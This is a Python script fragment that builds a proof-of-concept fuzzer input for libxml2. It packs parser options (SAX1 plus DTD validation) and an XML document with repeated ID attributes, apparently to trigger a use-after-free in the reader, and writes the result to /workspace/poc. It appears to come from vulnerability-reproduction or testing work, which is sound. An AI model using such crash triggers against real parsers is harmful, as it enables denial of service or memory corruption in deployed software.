# The fuzzer uses ByteStream which reads:
# 1. int (4 bytes) for options
# 2. size_t (8 bytes on 64-bit) for encoding string length, then that many bytes for encoding
# 3. remaining bytes as file content

# Options: XML_PARSE_DTDVALID = 1<<4 = 16, XML_PARSE_SAX1 = 1<<9 = 512
# Using SAX1 + DTD validation: attributes won't be interned in dict
# SAX1 = 512, DTDVALID = 16 -> 528
options = 16 | 512  # 528 = 0x00000210

# Encoding: empty string (length = 0)
encoding_len = 0

# XML content that triggers the bug:
# - Internal DTD with ID attribute declaration
# - Multiple elements with ID attributes so the reader frees earlier nodes
xml_content = b"""<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (item*)>
<!ELEMENT item EMPTY>
<!ATTLIST item id ID #IMPLIED>
]>
<root>
<item id="a"/>
<item id="b"/>
<item id="c"/>
<item id="d"/>
<item id="e"/>
</root>"""

# Build the fuzzer input
data = struct.pack('<i', options)  # 4 bytes, little-endian int
data += struct.pack('<Q', encoding_len)  # 8 bytes, little-endian size_t (64-bit)
data += xml_content

with open('/workspace/poc', 'wb') as f:
    f.write(data)

print(f"Generated PoC: {len(data)} bytes")
print(f"Options: {options} (0x{options:08x})")
print(f"First 20 bytes hex: {data[:20].hex()}")"}
